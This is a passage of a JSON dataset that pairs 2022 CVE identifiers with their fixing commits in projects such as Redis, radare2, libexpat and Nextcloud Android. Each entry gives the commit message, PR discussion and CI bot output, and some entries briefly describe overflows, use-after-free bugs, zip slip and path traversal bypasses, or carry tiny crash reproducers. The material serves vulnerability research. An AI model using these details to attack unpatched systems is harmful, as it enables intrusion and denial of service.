[src/base/Connection.cpp](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL2Jhc2UvQ29ubmVjdGlvbi5jcHA=) | `87.82% <0.00%> (-0.87%)` | :arrow_down: |\n\nHelp us with your feedback. Take ten seconds to tell us [how you rate us](https://about.codecov.io/nps?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci). Have a feature suggestion? [Share it here.](https://app.codecov.io/gh/feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci)\n\n</details>\n\n[:umbrella: View full report at Codecov](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).   \n:loudspeaker: Do you have feedback about the report comment? [Let us know in this issue](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).\n Hi, I saw there were two CVEs assigned to this: CVE-2022-48257 and CVE-2022-48258.\r\n\r\nIs there a reason why this is not merged yet? Thanks!",
            "pr_title_words": 8,
            "comments_words": 201,
            "total_other_info_words": 209
        },
        {
            "cve-id": "CVE-2022-35977",
            "commit_url": "https://github.com/redis/redis/commit/1ec82e6e97e1db06a72ca505f9fbf6b981f31ef7",
            "commit_msg": "Avoid integer overflows in SETRANGE and SORT (CVE-2022-35977) (#11720)\n\nAuthenticated users issuing specially crafted SETRANGE and SORT(_RO)\r\ncommands can trigger an integer overflow, resulting with Redis attempting\r\nto allocate impossible amounts of memory and abort with an OOM panic.",
            "commit_msg_words": 39,
            "other_info": "Avoid integer overflows in SETRANGE and SORT (CVE-2022-35977)",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-28071",
            "commit_url": "https://github.com/radareorg/radare2/commit/65448811e5b9582a19cf631e03cfcaa025a92ef5",
            "commit_msg": "Fix UAF in aaft (tests_64923) ##crash\n\nReported by giantbranch of NSFOCUS TIANJI Lab",
            "commit_msg_words": 13,
            "other_info": "Soft crashfixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-25236",
            "commit_url": "https://github.com/libexpat/libexpat/commit/a2fe525e660badd64b6c557c2b1ec26ddc07f6e4",
            "commit_msg": "lib: Protect against malicious namespace declarations (CVE-2022-25236)",
            "commit_msg_words": 7,
            "other_info": "[CVE-2022-25236] lib: Protect against insertion of namesep characters into namespace URIs CVE requested from Mitre just now. Received `CVE-2022-25236`.",
            "pr_title_words": 11,
            "comments_words": 8,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2022-1297",
            "commit_url": "https://github.com/radareorg/radare2/commit/0a557045476a2969c7079aec9eeb29d02f2809c6",
            "commit_msg": "Fix oobread and unaligned casts in the NE entrypoint logic ##crash\n\n* Reported by @hmsec via huntr.dev\n* Reproducer: nepocaligns\n* BountyID: ec538fa4-06c6-4050-a141-f60153ddeaac",
            "commit_msg_words": 23,
            "other_info": "Fix oobread and unaligned casts in the NE entrypoint logic ##crash",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2022-38667",
            "commit_url": "https://github.com/CrowCpp/Crow/commit/fba01dc76d6ea940ad7c8392e8f39f9647241d8e",
            "commit_msg": "Prevent HTTP pipelining which Crow doesn't support.",
            "commit_msg_words": 7,
            "other_info": "Prevent HTTP pipelining",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-24897",
            "commit_url": "https://github.com/xwiki/xwiki-commons/commit/215951cfb0f808d0bf5b1097c9e7d1e503449ab8",
            "commit_msg": "XWIKI-5168: Don't allow some methods in velocity introspector (#127)",
            "commit_msg_words": 9,
            "other_info": "XWIKI-5168: Don't allow some methods in velocity introspector",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-29567",
            "commit_url": "https://github.com/vaadin/flow-components/commit/e70a2dff396d32999c6b5e771869b2fed0185e11",
            "commit_msg": "fix data provider getId implementation",
            "commit_msg_words": 5,
            "other_info": "fix: Use incremental numeric id as a key for Tree Grid items [![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/vaadin/flow-components?pullRequest=3046) <br/>All committers have signed the CLA. Kudos, SonarCloud Quality Gate passed!&nbsp; &nbsp; [![Quality Gate passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/passed-16px.png 'Quality Gate passed')](https://sonarcloud.io/dashboard?id=vaadin_flow-components&pullRequest=3046)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=CODE_SMELL) [3695 Code Smells](https://sonarcloud.io/project/issues?id=vaadin_flow-components&pullRequest=3046&resolved=false&types=CODE_SMELL)\n\n[![No Coverage information](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/NoCoverageInfo-16px.png 'No Coverage information')](https://sonarcloud.io/component_measures?id=vaadin_flow-components&pullRequest=3046) No Coverage information  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=vaadin_flow-components&pullRequest=3046&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=vaadin_flow-components&pullRequest=3046&metric=new_duplicated_lines_density&view=list)\n\n Hi @mshabarov and @sissbruecker, when i performed cherry-pick to this commit to 23.0, i have encountered the following issue. Can you take a look and pick it manually?\n Error Message:\n Error: Command failed: git cherry-pick 8fe08611e304779df01ecd6306d478a9c0edced0\nerror: could not apply 8fe08611e... fix: Use incremental numeric id as a key for Tree Grid items (#3046)\nhint: After resolving the conflicts, mark them with\nhint: \"git add/rm <pathspec>\", then run\nhint: \"git cherry-pick --continue\".\nhint: You can instead skip this commit with \"git cherry-pick --skip\".\nhint: To abort and get back to the state before \"git cherry-pick\",\nhint: run \"git cherry-pick --abort\".\n Hi @mshabarov and @sissbruecker, when i performed cherry-pick to this commit to 22.0, i have encountered the following issue. Can you take a look and pick it manually?\n Error Message:\n Error: Command failed: git cherry-pick 8fe08611e304779df01ecd6306d478a9c0edced0\nerror: could not apply 8fe08611e... fix: Use incremental numeric id as a key for Tree Grid items (#3046)\nhint: After resolving the conflicts, mark them with\nhint: \"git add/rm <pathspec>\", then run\nhint: \"git cherry-pick --continue\".\nhint: You can instead skip this commit with \"git cherry-pick --skip\".\nhint: To abort and get back to the state before \"git cherry-pick\",\nhint: run \"git cherry-pick --abort\".\n Hi @mshabarov and @sissbruecker, when i performed cherry-pick to this commit to 14.8, i have encountered the following issue. Can you take a look and pick it manually?\n Error Message:\n Error: Command failed: git cherry-pick 8fe08611e304779df01ecd6306d478a9c0edced0\nerror: could not apply 8fe08611e... fix: Use incremental numeric id as a key for Tree Grid items (#3046)\nhint: After resolving the conflicts, mark them with\nhint: \"git add/rm <pathspec>\", then run\nhint: \"git cherry-pick --continue\".\nhint: You can instead skip this commit with \"git cherry-pick --skip\".\nhint: To abort and get back to the state before \"git cherry-pick\",\nhint: run \"git cherry-pick --abort\".\n This ticket/PR has been released with Vaadin 23.1.0.beta1 and is also targeting the upcoming stable 23.1.0 version.",
            "pr_title_words": 12,
            "comments_words": 381,
            "total_other_info_words": 393
        },
        {
            "cve-id": "CVE-2022-38072",
            "commit_url": "https://github.com/admesh/admesh/commit/5fab257268a0ee6f832c18d72af89810a29fbd5f",
            "commit_msg": "Check the neighbor_index in stl_check_normal_vector\n\n\r\nFixes #60",
            "commit_msg_words": 7,
            "other_info": "Check the neighbor_index in stl_check_normal_vector. Closes #60 @hroncok could you please review these changes? It is a fix for a security issue. Thanks.",
            "pr_title_words": 7,
            "comments_words": 16,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2022-28937",
            "commit_url": "https://github.com/FISCO-BCOS/FISCO-BCOS/commit/111d939c948cc54e5742ac1d50c24cd0e0cf9ab2",
            "commit_msg": "Fix the problem that malicious nodes set the view to int64_t max and cause the view to overflow when the fastViewChange",
            "commit_msg_words": 21,
            "other_info": "fix viewchange overflow",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-43634",
            "commit_url": "https://github.com/Netatalk/netatalk/commit/72216b33128365037466f357da572a28e0496ca4",
            "commit_msg": "fix CVE-2022-43634",
            "commit_msg_words": 2,
            "other_info": "fix CVE-2022-43634",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-38298",
            "commit_url": "https://github.com/appsmithorg/appsmith/commit/c59351ef94f9780c2a1ffc991e29b9272ab9fe64",
            "commit_msg": "Adding a check for invalid hosts on redirects as well",
            "commit_msg_words": 10,
            "other_info": "fix: Adding a check for invalid hosts on redirects as well **The latest updates on your projects**. Learn more about [Vercel for Git \u2197\ufe0e](https://vercel.link/github-learn-more)\n\n\n<details><summary>1 Ignored Deployment</summary>\n\n| Name | Status | Preview | Updated |\n| :--- | :----- | :------ | :------ |\n| **appsmith** | \u2b1c\ufe0f Ignored ([Inspect](https://vercel.com/get-appsmith/appsmith/5dPrX1voRwFoE279ZmoGTWC82Tpm)) |  | Aug 6, 2022 at 6:42AM (UTC) |\n</details>",
            "pr_title_words": 11,
            "comments_words": 50,
            "total_other_info_words": 61
        },
        {
            "cve-id": "CVE-2022-4772",
            "commit_url": "https://github.com/dgarijo/Widoco/commit/f2279b76827f32190adfa9bd5229b7d5a147fa92",
            "commit_msg": "vuln-fix: Zip Slip Vulnerability\n\nThis fixes a Zip-Slip vulnerability.\n\nThis change does one of two things. This change either\n\n1. Inserts a guard to protect against Zip Slip.\nOR\n2. Replaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nFor number 2, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: High\nCVSSS: 7.4\nDetection: CodeQL (https://codeql.github.com/codeql-query-help/java/java-zipslip/) & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.ZipSlip)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/16\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 141,
            "other_info": "[SECURITY] Fix Zip Slip Vulnerability Please push your suggestions to the `dev` branch :) Retargeted Thanks! Hi @dgarijo  do you need assistance with vulnerability disclosure and getting a CVE number assigned for this vulnerability? Friendly ping on the above question ^ We are no longer using zip, so I guess there is no need? Thanks in any case!",
            "pr_title_words": 5,
            "comments_words": 53,
            "total_other_info_words": 58
        },
        {
            "cve-id": "CVE-2022-40317",
            "commit_url": "https://github.com/openkm/document-management-system/commit/870d518f7de349c3fa4c7b9883789fdca4590c4e",
            "commit_msg": "Reported XSS vulnerability\n\nFix #333",
            "commit_msg_words": 5,
            "other_info": "Reported XSS vulnerability",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-28068",
            "commit_url": "https://github.com/radareorg/radare2/commit/637f4bd1af6752e28e0a9998e954e2e9ce6fa992",
            "commit_msg": "Fix oobread crash in DWARF parser (tests_64924) ##crash\n\nReported by giantbranch of NSFOCUS TIANJI Lab",
            "commit_msg_words": 15,
            "other_info": "Fix oobread crash in DWARF parser (tests_64924) ##crash",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-0695",
            "commit_url": "https://github.com/radareorg/radare2/commit/634b886e84a5c568d243e744becc6b3223e089cf",
            "commit_msg": "Fix DoS in PE/QNX/DYLDCACHE/PSX parsers ##crash\n\n* Reported by lazymio\n* Reproducer: AAA4AAAAAB4=",
            "commit_msg_words": 13,
            "other_info": "Fix DoS in PE/QNX/DYLDCACHE/PSX parsers ##crash",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-36052",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/9cdec6e19865d7b0d8caf61f1a34001f64d565b0",
            "commit_msg": "Prevent a possible read out of bounds in the processing of IPv6 extension headers.",
            "commit_msg_words": 14,
            "other_info": "uipbuf: Do not assume that there is enough space for a following extension header",
            "pr_title_words": 14,
            "comments_words": 0,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2022-27416",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/9297ac29af91324e3f94580b8ffc2a40a4d59e98",
            "commit_msg": "Bug #702 fix double free in Juniper DLT",
            "commit_msg_words": 8,
            "other_info": "Bug #702 fix double free in Juniper DLT",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-27941",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/a135cea13507b5d2f810d762390ba37d6b93aa3e",
            "commit_msg": "But #716 heap-buffer-overflow in get_l2len_protocol()",
            "commit_msg_words": 5,
            "other_info": "But #716 heap-buffer-overflow in get_l2len_protocol()",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-1383",
            "commit_url": "https://github.com/radareorg/radare2/commit/1dd65336f0f0c351d6ea853efcf73cf9c0030862",
            "commit_msg": "Fix oobread bug in NE parser ##crash\n\n* Reported by @cnitlrt via huntrdev\r\n* BountyID: 02b4b563-b946-4343-9092-38d1c5cd60c9\r\n* Reproducer: neoobread",
            "commit_msg_words": 19,
            "other_info": "Fix oobread bug in NE parser ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-33105",
            "commit_url": "https://github.com/redis/redis/commit/4a7a4e42db8ff757cdf3f4a824f66426036034ef",
            "commit_msg": "Fix memory leak in streamGetEdgeID (#10753)\n\nsi is initialized by streamIteratorStart(), we should call\r\nstreamIteratorStop() on it when done.\r\n\r\nregression introduced in #9127 (redis 7.0)",
            "commit_msg_words": 25,
            "other_info": "Fix memory leak in streamGetEdgeID @Yuuoniy thank you.\r\np.s. the reason why this doesn't usually leak is that rax iterator has static buffers for short keys and shallow stacks.\r\nfor streams, the keys are always short, so the key would never leak any memory.\r\nbut the stack may leak on large streams.\r\n\r\nthis looks like a regression in redis 7.0 (#9127) that could in cause leaks in trimming (XADD, XTRIM), and also XDEL and AOFRW.\r\n\r\n@itamarhaber @guybe7 correct me if i'm wrong. @oranagra I see, thanks for your explanation. I found this one when went through the PR #10353 , and thought it will result in memory leak as well.  Apparently there's a CVE for this issue: https://github.com/advisories/GHSA-35rf-7vhx-9phr",
            "pr_title_words": 5,
            "comments_words": 113,
            "total_other_info_words": 118
        },
        {
            "cve-id": "CVE-2022-24886",
            "commit_url": "https://github.com/nextcloud/android/commit/27559efb79d45782e000b762860658d49e9c35e9",
            "commit_msg": "Make PendingIntents immutable\n\nGood practice for security\n\nSigned-off-by: \u00c1lvaro Brey Vilas <alvaro.brey@nextcloud.com>",
            "commit_msg_words": 12,
            "other_info": "Make PendingIntents immutable /backport to stable-3.19 /rebase blue-Light-IT test failed: https://www.kaminsky.me/nc-dev/android-integrationTests/9726-Screenshot-blue-Light-12-08  # [Codecov](https://codecov.io/gh/nextcloud/android/pull/9726?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) Report\n> Merging [#9726](https://codecov.io/gh/nextcloud/android/pull/9726?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (d522236) into [master](https://codecov.io/gh/nextcloud/android/commit/7eaed66ebc9348e9b9893314973233c3bd72cc82?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (7eaed66) will **decrease** coverage by `0.87%`.\n> The diff coverage is `0.00%`.\n\n> :exclamation: Current head d522236 differs from pull request most recent head 4ac0baa. Consider uploading reports for the commit 4ac0baa to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #9726      +/-   ##\n==========================================\n- Coverage   31.49%   30.62%   -0.88%     \n==========================================\n  Files         505      505              \n  Lines       38583    38589       +6     \n  Branches     5381     5381              \n==========================================\n- Hits        12152    11816     -336     \n- Misses      24581    24965     +384     \n+ Partials     1850     1808      -42     \n```\n\n\n\n| [Impacted Files](https://codecov.io/gh/nextcloud/android/pull/9726?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | Coverage \u0394 | |\n|---|---|---|\n| [...extcloud/client/integrations/deck/DeckApiImpl.java](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9pbnRlZ3JhdGlvbnMvZGVjay9EZWNrQXBpSW1wbC5qYXZh) | `100.00% <\u00f8> (\u00f8)` | |\n| [...nextcloud/client/jobs/MediaFoldersDetectionWork.kt](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9qb2JzL01lZGlhRm9sZGVyc0RldGVjdGlvbldvcmsua3Q=) | `16.90% <0.00%> (-0.49%)` | :arrow_down: |\n| [...java/com/nextcloud/client/jobs/NotificationWork.kt](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9qb2JzL05vdGlmaWNhdGlvbldvcmsua3Q=) | `0.00% <0.00%> (\u00f8)` | |\n| [...n/java/com/nextcloud/client/media/PlayerService.kt](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9tZWRpYS9QbGF5ZXJTZXJ2aWNlLmt0) | `0.00% <0.00%> (\u00f8)` | |\n| [...client/notifications/AppNotificationManagerImpl.kt](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9ub3RpZmljYXRpb25zL0FwcE5vdGlmaWNhdGlvbk1hbmFnZXJJbXBsLmt0) | `49.12% <0.00%> (\u00f8)` | |\n| [...wncloud/android/files/services/FileDownloader.java](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vb3duY2xvdWQvYW5kcm9pZC9maWxlcy9zZXJ2aWNlcy9GaWxlRG93bmxvYWRlci5qYXZh) | `16.37% <0.00%> (-0.12%)` | :arrow_down: |\n| [.../owncloud/android/files/services/FileUploader.java](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vb3duY2xvdWQvYW5kcm9pZC9maWxlcy9zZXJ2aWNlcy9GaWxlVXBsb2FkZXIuamF2YQ==) | `51.62% <\u00f8> (\u00f8)` | |\n| [.../owncloud/android/syncadapter/FileSyncAdapter.java](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vb3duY2xvdWQvYW5kcm9pZC9zeW5jYWRhcHRlci9GaWxlU3luY0FkYXB0ZXIuamF2YQ==) | `4.25% <0.00%> (\u00f8)` | |\n| [...operations/RemoveRemoteEncryptedFileOperation.java](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vb3duY2xvdWQvYW5kcm9pZC9vcGVyYXRpb25zL1JlbW92ZVJlbW90ZUVuY3J5cHRlZEZpbGVPcGVyYXRpb24uamF2YQ==) | `0.00% <0.00%> (-66.00%)` | :arrow_down: |\n| [.../java/com/nextcloud/client/jobs/OfflineSyncWork.kt](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL21haW4vamF2YS9jb20vbmV4dGNsb3VkL2NsaWVudC9qb2JzL09mZmxpbmVTeW5jV29yay5rdA==) | `15.00% <0.00%> (-50.00%)` | :arrow_down: |\n| ... and [23 more](https://codecov.io/gh/nextcloud/android/pull/9726/diff?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | |\n APK file: https://www.kaminsky.me/nc-dev/android-artifacts/9726.apk <br/><br/> ![qrcode](https://www.kaminsky.me/nc-dev/android-artifacts/9726.png) <br/><br/>To test this change/fix you can simply download above APK file and install and test it in parallel to your existing Nextcloud app.  <h1>Codacy</h1> <h1>Lint</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tablerow0'><td>Type</td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/master.html'>master</a></td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/129.html'>PR</a></td></tr><tr class='tablerow1'><td>Warnings</td><td>124</td><td>102</td></tr><tr class='tablerow0'><td>Errors</td><td>0</td><td>0</td></tr></table>       <h1><a href='https://www.kaminsky.me/nc-dev/android-findbugs/129.html'>SpotBugs</a> (new)</h1>      <table width='500' cellpadding='5' cellspacing='2'>         <tr class='tableheader'>            <th align='left'>Warning Type</th>            <th align='right'>Number</th>         </tr>         <tr class='tablerow0'>            <td>               Bad practice Warnings            </td>            <td align='right'>28</td>         </tr>         <tr class='tablerow1'>            <td>               Correctness Warnings            </td>            <td align='right'>82</td>         </tr>         <tr class='tablerow0'>            <td>               Experimental Warnings            </td>            <td align='right'>1</td>         </tr>         <tr class='tablerow1'>            <td>               Internationalization Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Malicious code vulnerability Warnings            </td>            <td align='right'>57</td>         </tr>         <tr class='tablerow1'>            <td>               Multithreaded correctness Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Performance Warnings            </td>            <td align='right'>68</td>         </tr>         <tr class='tablerow1'>            <td>               Security Warnings            </td>            <td align='right'>29</td>         </tr>         <tr class='tablerow0'>            <td>               Dodgy code Warnings            </td>            <td align='right'>358</td>         </tr>         <tr class='tablerow1'>            <td>               <b>Total</b>            </td>            <td align='right'>               <b>641</b>            </td>         </tr>      </table>       <h1><a href='https://www.kaminsky.me/nc-dev/android-findbugs/master.html'>SpotBugs</a> (master)</h1>      <table width='500' cellpadding='5' cellspacing='2'>         <tr class='tableheader'>            <th align='left'>Warning Type</th>            <th align='right'>Number</th>         </tr>         <tr class='tablerow0'>            <td>               Bad practice Warnings            </td>            <td align='right'>28</td>         </tr>         <tr class='tablerow1'>            <td>               Correctness Warnings            </td>            <td align='right'>82</td>         </tr>         <tr class='tablerow0'>            <td>               Experimental Warnings            </td>            <td align='right'>1</td>         </tr>         <tr class='tablerow1'>            <td>               Internationalization Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Malicious code vulnerability Warnings            </td>            <td align='right'>57</td>         </tr>         <tr class='tablerow1'>            <td>               Multithreaded correctness Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Performance Warnings            </td>            <td align='right'>68</td>         </tr>         <tr class='tablerow1'>            <td>               Security Warnings            </td>            <td align='right'>29</td>         </tr>         <tr class='tablerow0'>            <td>               Dodgy code Warnings            </td>            <td align='right'>358</td>         </tr>         <tr class='tablerow1'>            <td>               <b>Total</b>            </td>            <td align='right'>               <b>641</b>            </td>         </tr>      </table>      master-IT test failed: https://www.kaminsky.me/nc-dev/android-integrationTests/3691-IT-master-13-28  The backport to stable-3.19 failed. Please do this backport manually.",
            "pr_title_words": 3,
            "comments_words": 474,
            "total_other_info_words": 477
        },
        {
            "cve-id": "CVE-2022-39210",
            "commit_url": "https://github.com/nextcloud/android/commit/cd3bd0845a97e1d43daa0607a122b66b0068c751",
            "commit_msg": "Don't accept uris to upload from external apps if they contain this app's package name\n\nPrevent leaks of files in this app's storage\n\nCo-authored-by: Tobias Kaminsky <tobias@kaminsky.me>\nSigned-off-by: \u00c1lvaro Brey <alvaro.brey@nextcloud.com>",
            "commit_msg_words": 31,
            "other_info": "Prevent URI uploads from external apps that target private storage APK file: https://www.kaminsky.me/nc-dev/android-artifacts/10544.apk <br/><br/> ![qrcode](https://www.kaminsky.me/nc-dev/android-artifacts/10544.png) <br/><br/>To test this change/fix you can simply download above APK file and install and test it in parallel to your existing Nextcloud app.  <h1>Codacy</h1> <h1>Lint</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tablerow0'><td>Type</td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/master.html'>master</a></td><td><a href='https://www.kaminsky.me/nc-dev/android-lint/1818.html'>PR</a></td></tr><tr class='tablerow1'><td>Warnings</td><td>85</td><td>85</td></tr><tr class='tablerow0'><td>Errors</td><td>0</td><td>0</td></tr></table> <h1>SpotBugs</h1><table><tr><th>Category</th><th><a href='https://www.kaminsky.me/nc-dev/android-findbugs/master.html'>Base</a></th><th><a href='https://www.kaminsky.me/nc-dev/android-findbugs/1818.html'>New</a></th></tr><tr><td>Bad practice</td><td>29</td><td>29</td></tr><tr><td>Correctness</td><td>46</td><td>46</td></tr><tr><td>Dodgy code</td><td>353</td><td>353</td></tr><tr><td>Experimental</td><td>1</td><td>1</td></tr><tr><td>Internationalization</td><td>9</td><td>9</td></tr><tr><td>Multithreaded correctness</td><td>9</td><td>9</td></tr><tr><td>Performance</td><td>59</td><td>59</td></tr><tr><td>Security</td><td>28</td><td>28</td></tr><tr><td><b>Total</b></td><td><b>534</b></td><td><b>534</b></td></tr></table>      # 